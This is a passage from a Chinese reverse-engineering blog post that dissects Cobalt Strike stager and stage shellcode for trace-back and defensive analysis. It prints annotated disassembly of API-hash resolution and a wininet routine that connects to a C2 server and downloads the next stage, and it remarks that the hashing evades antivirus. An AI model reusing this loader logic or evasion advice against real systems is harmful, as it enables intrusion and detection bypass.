<p>但是CS采用的是另一种方式，因为上面我说的方式需要将<code>DLL Name</code>和<code>Func Name</code>分别计算哈希并判断，而CS是将它的hash值定义为<code>HASH = hash(DLL Name) +hash(Func Name)</code>（这里的<code>+</code>号是加法的加，而不是哈希值拼接的意思）。然后CS的思路为：</p>
<ol>
<li>遍历<code>InMemoryOrderModuleList</code>链表结构，进入到每一个<code>DLL</code>中寻找导出函数，计算函数名的哈希值；</li>
<li>计算<code>HASH = hash(DLL Name) +hash(Func Name)</code>是否和事前计算出来的目标函数哈希值是否相符；</li>
<li>若相符则直接<code>jmp eax</code>进行跳转执行。</li>
</ol>
<p>其实无论哪种思路都是规避查杀的一种方式，避免了敏感的<code>kernel32</code>、<code>GetModuleHandle</code>等明文字符出现在Shellcode中，避免静态查杀被干掉。<strong>虽然引入了Hash算法会稍稍增大Shellcode体积，但是如果要使用一些长度较长的函数的话，这么做即减少了Shellcode体积又规避了查杀，后续稍微改改算法又能绕过一波杀软，怪不得MSF和CS都大量地使用这种Shellcode写法。</strong></p>
<p>接下来我们再一步一步看Shellcode的思路与细节：</p>
<ol>
<li>获取<code>_LDR_DATA_TABLE_ENTRY</code> 中的<code>DLLBase</code>；</li>
<li>找到从MZ头到PE头再找到导入表；</li>
<li>再由导入表获取导出函数名以及个数，遍历获取计算HASH，再与事先计算好的8字节长的HASH匹配。</li>
</ol>
<pre class="highlight"><code class="x86asm"><span class="number">0x0030</span>:  8B <span class="number">52</span> <span class="number">10</span>   <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span> + <span class="number">0x10</span>] <span class="comment">;edx=DLLBase</span>
<span class="number">0x0033</span>:  8B <span class="number">42</span> 3C   <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span> + <span class="number">0x3c</span>] <span class="comment">;eax=PE Header RVA</span>
<span class="number">0x0036</span>:  <span class="number">01</span> D0      <span class="keyword">add</span>    <span class="built_in">eax</span>, <span class="built_in">edx</span>                    <span class="comment">;eax=PE Header VA</span>
<span class="number">0x0038</span>:  8B <span class="number">40</span> <span class="number">78</span>   <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x78</span>] <span class="comment">;eax=ExportTable RVA</span>
<span class="number">0x003b</span>:  <span class="number">85</span> C0      <span class="keyword">test</span>   <span class="built_in">eax</span>, <span class="built_in">eax</span>
<span class="number">0x003d</span>:  <span class="number">74</span> 4A      <span class="keyword">je</span>     <span class="number">0x89</span>
<span class="number">0x003f</span>:  <span class="number">01</span> D0      <span class="keyword">add</span>    <span class="built_in">eax</span>, <span class="built_in">edx</span>                    <span class="comment">;eax=ExportTable RVA</span>
<span class="number">0x0041</span>:  <span class="number">50</span>         <span class="keyword">push</span>   <span class="built_in">eax</span>                         <span class="comment">;save ExportTable VA</span>
<span class="number">0x0042</span>:  8B <span class="number">48</span> <span class="number">18</span>   <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x18</span>] <span class="comment">;ecx=NumberOfNames  </span>
<span class="number">0x0045</span>:  8B <span class="number">58</span> <span class="number">20</span>   <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x20</span>] <span class="comment">;ebx=AddressOfNamesRVA</span>
<span class="number">0x0048</span>:  <span class="number">01</span> D3      <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="built_in">edx</span>                    <span class="comment">;ebx=AddressOfNamesVA</span>
<span class="number">0x004a</span>:  E3 3C      <span class="keyword">jecxz</span>  <span class="number">0x88</span>                        <span class="comment">;若遍历完毕寻找下一个模块</span>
<span class="number">0x004c</span>:  <span class="number">49</span>         <span class="keyword">dec</span>    <span class="built_in">ecx</span>
<span class="number">0x004d</span>:  8B <span class="number">34</span> 8B   <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="built_in">ecx</span>*<span class="number">4</span>]
<span class="number">0x0050</span>:  <span class="number">01</span> D6      <span class="keyword">add</span>    <span class="built_in">esi</span>, <span class="built_in">edx</span>                     <span class="comment">;esi=ExportFunctionNameVA</span>
<span class="number">0x0052</span>:  <span class="number">31</span> FF      <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
<span class="number">0x0054</span>:  <span class="number">31</span> C0      <span class="keyword">xor</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>
<span class="number">0x0056</span>:  AC         <span class="keyword">lodsb</span>  <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          
<span class="number">0x0057</span>:  C1 CF <span class="number">0D</span>   <span class="keyword">ror</span>    <span class="built_in">edi</span>, <span class="number">0xd</span>
<span class="number">0x005a</span>:  <span class="number">01</span> C7      <span class="keyword">add</span>    <span class="built_in">edi</span>, <span class="built_in">eax</span>
<span class="number">0x005c</span>:  <span class="number">38</span> E0      <span class="keyword">cmp</span>    <span class="built_in">al</span>, <span class="number">ah</span>                       <span class="comment">;判断等于\x00，即字符串结束</span>
<span class="number">0x005e</span>:  <span class="number">75</span> F4      <span class="keyword">jne</span>    <span class="number">0x54</span>                         <span class="comment">;edi=FunctionNameHash</span>
<span class="number">0x0060</span>:  <span class="number">03</span> <span class="number">7D</span> F8   <span class="keyword">add</span>    <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">8</span>]     <span class="comment">;[ebp-8]=DLL hash</span>
                                                                    <span class="comment">;edi=DLL hash+FunctionNameHash</span>
<span class="comment">;[ebp+0x24]=倒数十入栈的参数，即函数调用的第一个参数，即提前计算好的Hash值</span>
<span class="number">0x0063</span>:  3B <span class="number">7D</span> <span class="number">24</span>   <span class="keyword">cmp</span>    <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">0x24</span>]  
<span class="number">0x0066</span>:  <span class="number">75</span> E2      ne    <span class="number">0x4a</span>                         <span class="comment">;若不相等，计算下一个导出函数</span>

<span class="number">0x0080</span>:  5B         <span class="keyword">pop</span>    <span class="built_in">ebx</span>
<span class="number">0x0081</span>:  5B         <span class="keyword">pop</span>    <span class="built_in">ebx</span>                          <span class="comment">;调整栈帧</span>
<span class="number">0x0082</span>:  <span class="number">61</span>         popal                               <span class="comment">;恢复寄存器</span>
<span class="number">0x0083</span>:  <span class="number">59</span>         <span class="keyword">pop</span>    <span class="built_in">ecx</span>                          <span class="comment">;返回地址</span>
<span class="number">0x0084</span>:  5A         <span class="keyword">pop</span>    <span class="built_in">edx</span>                          <span class="comment">;call ebp的第一个参数，已经没用了</span>
<span class="number">0x0085</span>:  <span class="number">51</span>         <span class="keyword">push</span>   <span class="built_in">ecx</span>                          <span class="comment">;返回地址入栈</span>
<span class="number">0x0086</span>:  FF E0      <span class="keyword">jmp</span>    <span class="built_in">eax</span>                          <span class="comment">;jmp函数VA</span>
</code></pre>
<p>MZ文件头结构<code>_IMAGE_DOS_HEADER</code>如下，则指令<code>mov eax, [edx + 0x3c]</code>取出的是<code>e_lfanew</code>，即PE头的偏移。</p>
<pre class="highlight"><code class="x86asm"><span class="built_in">dt</span> _IMAGE_DOS_HEADER
ntdll!_IMAGE_DOS_HEADER
   +<span class="number">0x000</span> e_magic          : Uint2B
   +<span class="number">0x002</span> e_cblp           : Uint2B
   +<span class="number">0x004</span> e_cp             : Uint2B
   +<span class="number">0x006</span> e_crlc           : Uint2B
   +<span class="number">0x008</span> e_cparhdr        : Uint2B
   +<span class="number">0x00a</span> e_minalloc       : Uint2B
   +<span class="number">0x00c</span> e_maxalloc       : Uint2B
   +<span class="number">0x00e</span> e_ss             : Uint2B
   +<span class="number">0x010</span> e_sp             : Uint2B
   +<span class="number">0x012</span> e_csum           : Uint2B
   +<span class="number">0x014</span> e_ip             : Uint2B
   +<span class="number">0x016</span> e_cs             : Uint2B
   +<span class="number">0x018</span> e_lfarlc         : Uint2B
   +<span class="number">0x01a</span> e_ovno           : Uint2B
   +<span class="number">0x01c</span> e_res            : [<span class="number">4</span>] Uint2B
   +<span class="number">0x024</span> e_oemid          : Uint2B
   +<span class="number">0x026</span> e_oeminfo        : Uint2B
   +<span class="number">0x028</span> e_res2           : [<span class="number">10</span>] Uint2B
   +<span class="number">0x03c</span> e_lfanew         : Int4B       # [<span class="built_in">edx</span> + <span class="number">0x3c</span>] PE HEADER RVA
</code></pre>
<p>指令<code>mov eax, dword ptr [eax + 0x78]</code>从PE头找到导入表的位置，偏移<code>0x78=len(PE Signature)+len(Optional Header)=0x18+0x60</code>，而对应导出表的<code>IMAGE_EXPORT_DIRECTORY</code>结构体:</p>
<pre class="highlight"><code class="x86asm"> <span class="built_in">dt</span> IMAGE_EXPORT_DIRECTORY
ole32!IMAGE_EXPORT_DIRECTORY
   +<span class="number">0x000</span> Characteristics  : Uint4B
   +<span class="number">0x004</span> TimeDateStamp    : Uint4B
   +<span class="number">0x008</span> MajorVersion     : Uint2B
   +<span class="number">0x00a</span> MinorVersion     : Uint2B
   +<span class="number">0x00c</span> Name             : Uint4B
   +<span class="number">0x010</span> Base             : Uint4B
   +<span class="number">0x014</span> NumberOfFunctions : Uint4B
   +<span class="number">0x018</span> NumberOfNames    : Uint4B          # Fetch
   +<span class="number">0x01c</span> AddressOfFunctions : Uint4B        # Fetch
   +<span class="number">0x020</span> AddressOfNames   : Uint4B          # Fetch
   +<span class="number">0x024</span> AddressOfNameOrdinals : Uint4B     # Fetch
</code></pre>
<p>下面四条指令读取了导出表结构中的导出函数个数以及函数名、序号、地址等列表的地址，其实就是取到了遍历所需的数据。</p>
<pre class="highlight"><code class="x86asm"><span class="number">0x0042</span>:  8B <span class="number">48</span> <span class="number">18</span>                <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x18</span>] <span class="comment">;ecx=NumberOfNames  </span>
<span class="number">0x0045</span>:  8B <span class="number">58</span> <span class="number">20</span>                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x20</span>] <span class="comment">;ebx=AddressOfNamesRVA</span>
...
<span class="number">0x0069</span>:  8B <span class="number">58</span> <span class="number">24</span>                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x24</span>]  <span class="comment">;ebx=AddressOfNameOrdinalsRVA</span>
...
<span class="number">0x0072</span>:  8B <span class="number">58</span> 1C                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x1c</span>]  <span class="comment">;ebx=AddressOfFunctionsRVA</span>
</code></pre>
<p>若导出表不存在（即地址为0）或者遍历完整个导出表都无法找到函数则根据<code>InMemoryOrderModuleList</code>双链表的Flink找到下一个<code>_LDR_DATA_TABLE_ENTRY</code>结构体继续寻找。所以每次调用都会从第一个双链表的节点依次寻找，直到找到<code>kernel32.dll</code>里面的导出函数。</p>
<pre class="highlight"><code class="x86asm"><span class="number">0x0088</span>:  <span class="number">58</span>                      <span class="keyword">pop</span>    <span class="built_in">eax</span>
<span class="number">0x0089</span>:  5F                      <span class="keyword">pop</span>    <span class="built_in">edi</span>
<span class="number">0x008a</span>:  5A                      <span class="keyword">pop</span>    <span class="built_in">edx</span>                  <span class="comment">;edx=InMemoryOrderModuleList</span>
<span class="number">0x008b</span>:  8B <span class="number">12</span>                   <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>] <span class="comment">;InMemoryOrderModuleList-&gt;Flink</span>
<span class="number">0x008d</span>:  EB <span class="number">86</span>                   <span class="keyword">jmp</span>    <span class="number">0x15</span>                 <span class="comment">;next _LDR_DATA_TABLE_ENTRY </span>
</code></pre>
<p>由导出函数名和模块名产生的HASH匹配之后会计算出函数的地址，恢复寄存器，调整栈帧，入栈返回地址然后调用对应的导出函数。由于栈帧调整，此时栈内的参数正如<code>call ebp</code>之前设计的那样，按顺序逐个排列在栈内。</p>
<pre class="highlight"><code class="x86asm"><span class="number">0x0068</span>:  <span class="number">58</span>                      <span class="keyword">pop</span>    <span class="built_in">eax</span>                          <span class="comment">;eax=ExportTable RVA</span>
<span class="number">0x0069</span>:  8B <span class="number">58</span> <span class="number">24</span>                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x24</span>]  <span class="comment">;ebx=AddressOfNameOrdinalsRVA</span>
<span class="number">0x006c</span>:  <span class="number">01</span> D3                   <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="built_in">edx</span>                     <span class="comment">;ebx=AddressOfNameOrdinalsVA</span>
<span class="number">0x006e</span>:  <span class="number">66</span> 8B 0C 4B             <span class="keyword">mov</span>    <span class="built_in">cx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="built_in">ecx</span>*<span class="number">2</span>]   <span class="comment">;cx=OrdinalOfFunctionIndex</span>
<span class="number">0x0072</span>:  8B <span class="number">58</span> 1C                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x1c</span>]  <span class="comment">;ebx=AddressOfFunctionsRVA</span>
<span class="number">0x0075</span>:  <span class="number">01</span> D3                   <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="built_in">edx</span>                     <span class="comment">;ebx=AddressOfFunctionsVA</span>
<span class="number">0x0077</span>:  8B <span class="number">04</span> 8B                <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="built_in">ecx</span>*<span class="number">4</span>] <span class="comment">;eax=FunctionRVA</span>
<span class="number">0x007a</span>:  <span class="number">01</span> D0                   <span class="keyword">add</span>    <span class="built_in">eax</span>, <span class="built_in">edx</span>                     <span class="comment">;eax=FunctionVA</span>
<span class="number">0x007c</span>:  <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">24</span>             <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0x24</span>], <span class="built_in">eax</span>  <span class="comment">;函数VA覆盖栈中第十个参数</span>
<span class="number">0x0080</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>
<span class="number">0x0081</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>                          <span class="comment">;调整栈帧</span>
<span class="number">0x0082</span>:  <span class="number">61</span>                      popal                               <span class="comment">;恢复寄存器</span>
<span class="number">0x0083</span>:  <span class="number">59</span>                      <span class="keyword">pop</span>    <span class="built_in">ecx</span>                          <span class="comment">;返回地址</span>
<span class="number">0x0084</span>:  5A                      <span class="keyword">pop</span>    <span class="built_in">edx</span>                          <span class="comment">;call ebp的第一个参数，已经没用了</span>
<span class="number">0x0085</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>                          <span class="comment">;返回地址入栈</span>
<span class="number">0x0086</span>:  FF E0                   <span class="keyword">jmp</span>    <span class="built_in">eax</span>                          <span class="comment">;jmp函数VA</span>
</code></pre>
<h4 id="23-主要调用函数"><a class="markdownIt-Anchor" href="#23-主要调用函数"></a> 2.3 主要调用函数</h4>
<p>既然完成了函数寻址，那么后面的Shellcode就是负责下载Stage了。由于CS生成<code>Artifact.exe</code>时选择的是HTTP Listener，故主要动作还是加载&quot;winnet&quot;库，建立网络连接，利用InternetReadFile将Stage加载到VirtualAlloc申请的空间中，然后另起线程执行Stage。</p>
<pre class="highlight"><code class="x86asm"><span class="comment">; ==================== 核心函数 ====================</span>
<span class="number">0x008f</span>:  <span class="number">5D</span>                      <span class="keyword">pop</span>    <span class="built_in">ebp</span>
<span class="number">0x0090</span>:  <span class="number">68</span> 6E <span class="number">65</span> <span class="number">74</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x74656e</span>
<span class="number">0x0095</span>:  <span class="number">68</span> <span class="number">77</span> <span class="number">69</span> 6E <span class="number">69</span>          <span class="keyword">push</span>   <span class="number">0x696e6977</span>
<span class="number">0x009a</span>:  <span class="number">54</span>                      <span class="keyword">push</span>   <span class="built_in">esp</span>                  
<span class="number">0x009b</span>:  <span class="number">68</span> 4C <span class="number">77</span> <span class="number">26</span> <span class="number">07</span>          <span class="keyword">push</span>   <span class="number">0x726774c</span>
<span class="comment">; LoadLibraryA("wininet")</span>
<span class="number">0x00a0</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>                

<span class="number">0x00a2</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
<span class="number">0x00a4</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x00a5</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x00a6</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x00a7</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x00a8</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x00a9</span>:  <span class="number">68</span> 3A <span class="number">56</span> <span class="number">79</span> A7          <span class="keyword">push</span>   <span class="number">0xa779563a</span>
<span class="comment">; InternetOpenA(NULL, NULL, NULL, NULL, NULL)</span>
<span class="number">0x00ae</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>

<span class="comment">; jmp -&gt; jmp -&gt; call 0xfffffdae 操作完成了将ip入栈的操作，然后pop到ebx</span>
<span class="number">0x00b0</span>:  E9 <span class="number">84</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">jmp</span>    <span class="number">0x139</span>              

<span class="number">0x00b5</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>                <span class="comment">; ip addr</span>
<span class="number">0x00b6</span>:  <span class="number">31</span> C9                   <span class="keyword">xor</span>    <span class="built_in">ecx</span>, <span class="built_in">ecx</span>
<span class="number">0x00b8</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
<span class="number">0x00b9</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
<span class="number">0x00ba</span>:  6A <span class="number">03</span>                   <span class="keyword">push</span>   <span class="number">3</span>
<span class="number">0x00bc</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
<span class="number">0x00bd</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
<span class="number">0x00be</span>:  <span class="number">68</span> B5 <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x40b5</span>             <span class="comment">;port number</span>
<span class="number">0x00c3</span>:  <span class="number">53</span>                      <span class="keyword">push</span>   <span class="built_in">ebx</span>                <span class="comment">;ip addr</span>
<span class="number">0x00c4</span>:  <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span>
<span class="number">0x00c5</span>:  <span class="number">68</span> <span class="number">57</span> <span class="number">89</span> 9F C6          <span class="keyword">push</span>   <span class="number">0xc69f8957</span>
<span class="comment">; InternetConnectA(hInternet, serverIp, atoi(serverPort), NULL, NULL, 3, NULL, NULL)</span>
<span class="number">0x00ca</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>                

<span class="comment">; jmp  -&gt; call 0xce 将uri指针入栈 "/eFAp\x00"</span>
<span class="number">0x00cc</span>:  EB <span class="number">70</span>                   <span class="keyword">jmp</span>    <span class="number">0x13e</span>              
<span class="number">0x00ce</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>
<span class="number">0x00cf</span>:  <span class="number">31</span> D2                   <span class="keyword">xor</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span>
<span class="number">0x00d1</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
<span class="number">0x00d2</span>:  <span class="number">68</span> <span class="number">00</span> <span class="number">02</span> <span class="number">40</span> <span class="number">84</span>          <span class="keyword">push</span>   <span class="number">0x84400200</span>
<span class="number">0x00d7</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
<span class="number">0x00d8</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
<span class="number">0x00d9</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
<span class="number">0x00da</span>:  <span class="number">53</span>                      <span class="keyword">push</span>   <span class="built_in">ebx</span>
<span class="number">0x00db</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
<span class="number">0x00dc</span>:  <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span>
<span class="number">0x00dd</span>:  <span class="number">68</span> EB <span class="number">55</span> 2E 3B          <span class="keyword">push</span>   <span class="number">0x3b2e55eb</span>
<span class="comment">; HttpOpenRequestA(hConnection, NULL, serveruri, NULL, NULL, NULL, 0x84400200, NULL);</span>
<span class="number">0x00e2</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>                

<span class="number">0x00e4</span>:  <span class="number">89</span> C6                   <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="built_in">eax</span>
<span class="number">0x00e6</span>:  <span class="number">83</span> C3 <span class="number">50</span>                <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x50</span>           <span class="comment">; uri + 0x50 处的header</span>
<span class="number">0x00e9</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
<span class="number">0x00eb</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x00ec</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x00ed</span>:  6A FF                   <span class="keyword">push</span>   -<span class="number">1</span>
<span class="number">0x00ef</span>:  <span class="number">53</span>                      <span class="keyword">push</span>   <span class="built_in">ebx</span>
<span class="number">0x00f0</span>:  <span class="number">56</span>                      <span class="keyword">push</span>   <span class="built_in">esi</span>
<span class="number">0x00f1</span>:  <span class="number">68</span> <span class="number">2D</span> <span class="number">06</span> <span class="number">18</span> 7B          <span class="keyword">push</span>   <span class="number">0x7b18062d</span>
<span class="comment">; HttpSendRequestA( HINTERNET hRequest, LPCSTR lpszHeaders, 0xFFFFFFFF, NULL, 0)</span>
<span class="number">0x00f6</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>          

<span class="number">0x00f8</span>:  <span class="number">85</span> C0                   <span class="keyword">test</span>   <span class="built_in">eax</span>, <span class="built_in">eax</span>
<span class="number">0x00fa</span>:  0F <span class="number">84</span> C3 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">je</span>     <span class="number">0x2c3</span>
<span class="number">0x0100</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
<span class="number">0x0102</span>:  <span class="number">85</span> F6                   <span class="keyword">test</span>   <span class="built_in">esi</span>, <span class="built_in">esi</span>
<span class="number">0x0104</span>:  <span class="number">74</span> <span class="number">04</span>                   <span class="keyword">je</span>     <span class="number">0x10a</span>
<span class="number">0x0106</span>:  <span class="number">89</span> F9                   <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">edi</span>
<span class="number">0x0108</span>:  EB <span class="number">09</span>                   <span class="keyword">jmp</span>    <span class="number">0x113</span>
<span class="number">0x010a</span>:  <span class="number">68</span> AA C5 E2 <span class="number">5D</span>          <span class="keyword">push</span>   <span class="number">0x5de2c5aa</span>
<span class="number">0x010f</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>
<span class="number">0x0111</span>:  <span class="number">89</span> C1                   <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">eax</span>
<span class="number">0x0113</span>:  <span class="number">68</span> <span class="number">45</span> <span class="number">21</span> 5E <span class="number">31</span>          <span class="keyword">push</span>   <span class="number">0x315e2145</span>
 <span class="comment">; GetDesktopWindow()</span>
<span class="number">0x0118</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>               

<span class="number">0x011a</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
<span class="number">0x011c</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
<span class="number">0x011d</span>:  6A <span class="number">07</span>                   <span class="keyword">push</span>   <span class="number">7</span>
<span class="number">0x011f</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
<span class="number">0x0120</span>:  <span class="number">56</span>                      <span class="keyword">push</span>   <span class="built_in">esi</span>
<span class="number">0x0121</span>:  <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span>
<span class="number">0x0122</span>:  <span class="number">68</span> B7 <span class="number">57</span> E0 <span class="number">0B</span>          <span class="keyword">push</span>   <span class="number">0xbe057b7</span>
 <span class="comment">; InternetErrorDlg(eax, esi, ecx, 7, 0)</span>
<span class="number">0x0127</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>               
...
</code></pre>
<p>利用scdbg模拟执行Shellcode我们能够快速了解Shellcode到底执行了哪些函数：</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174738015.png" alt="image-20201021174738015"></p>
<p>至此，Stager Shellcode也大致分析完毕了。</p>
<h2 id="二-stage-shellcode"><a class="markdownIt-Anchor" href="#二-stage-shellcode"></a> 二、 Stage Shellcode</h2>
<h3 id="1-stub-shellcode"><a class="markdownIt-Anchor" href="#1-stub-shellcode"></a> 1. Stub Shellcode</h3>
<p>我们知道，当Stager Shellcode成功执行后会发起HTTP请求，而C&amp;C服务器会在简单的校验之后返回一个包含Stage Shellcode的响应，如下图的中标出的部分：</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021152015469.png" alt="image-20201021152015469"></p>
<p>该<code>Stage</code>包含众多信息，而我们如果能够得到流量，那么解析该<code>Stage</code>就能够极大地帮助溯源工作：</p>
<ol>
<li>
<p>C2 Server addr/domain &amp; public key</p>
</li>
<li>
<p>Beacon info decided by melleable C2 profile</p>
</li>
<li>
<p>Domain Fronting or not (HostHeader)</p>
</li>
<li>
<p>Cobalt Strike Version</p>
</li>
</ol>
<p>Stub是一段解密Shellcode主体执行的引导代码，会利用紧跟其后的异或密钥Xor_key和异或后的加密长度Xor_len进行解密Shellcode主体并执行。</p>
<p>从CS的源码来看，这段Stage Shellcode是通过xor.bin和xor64.bin两个生成的。</p>
<p>x86则会从xor.bin中随机提取一段Stub Shellcode并且填充一些随机长度的数据进行静态指纹规避，而x64会不加修改的直接复制xor64.bin内的内容作为Stub填充到Shellcode前部。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021152435115.png" alt="image-20201021152435115"></p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021153241758.png" alt="image-20201021153241758"></p>
<p>这些Xor.bin中的这些Stub仅是利用寄存器不同而已，所以字节码看起来也是不同的，但是实际做的操作是一样的。我们简单地看一下x86的Stub Shellcode，其主要的目的还是异或解密Shellcode并跳到Shellcode执行：</p>
<pre class="highlight"><code class="x86asm"><span class="number">0x0000</span>:  FC                <span class="keyword">cld</span>                       <span class="comment">;清除标志位</span>
<span class="number">0x0001</span>:  E8 <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">call</span>   <span class="number">0x11</span>               <span class="comment">;跳过垃圾数据</span>
<span class="number">0x0002</span>:  2E7140B186A83360250A17                      <span class="comment">;junk data</span>
<span class="number">0x0011</span>:  EB 2B             <span class="keyword">jmp</span>  <span class="number">0x3e</span>                 <span class="comment">;通过call得到xor_key地址</span>
<span class="number">0x0013</span>:  <span class="number">5D</span>                <span class="keyword">pop</span>  <span class="built_in">ebp</span>                  <span class="comment">;ebp=xor_key_addr</span>

<span class="number">0x0014</span>:  8B <span class="number">7D</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>] <span class="comment">;获取前4个字节，即edi=xor_key</span>
<span class="number">0x0017</span>:  <span class="number">83</span> C5 <span class="number">04</span>          <span class="keyword">add</span>  <span class="built_in">ebp</span>, <span class="number">4</span>
